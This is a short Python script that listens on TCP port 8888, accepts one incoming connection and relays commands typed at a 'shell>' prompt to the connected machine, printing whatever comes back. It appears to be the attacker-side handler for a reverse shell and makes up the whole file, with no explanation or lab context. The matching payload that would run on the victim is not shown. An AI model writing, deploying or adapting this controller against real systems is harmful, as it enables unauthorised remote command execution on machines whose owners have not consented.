import socket

HOST='0.0.0.0'
PORT=8888

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

s.bind((HOST, PORT))
s.listen(1)
print(f"[*] listening port {PORT}...")
conn, addr = s.accept()
print(f"[+] Connection established with {addr}")

while True:
    cmd = input("shell> ")
    if cmd.lower() == "exit":
        break
    conn.sendall(cmd.encode())
    data = conn.recv(115000)
    print(data.decode())

s.close()
    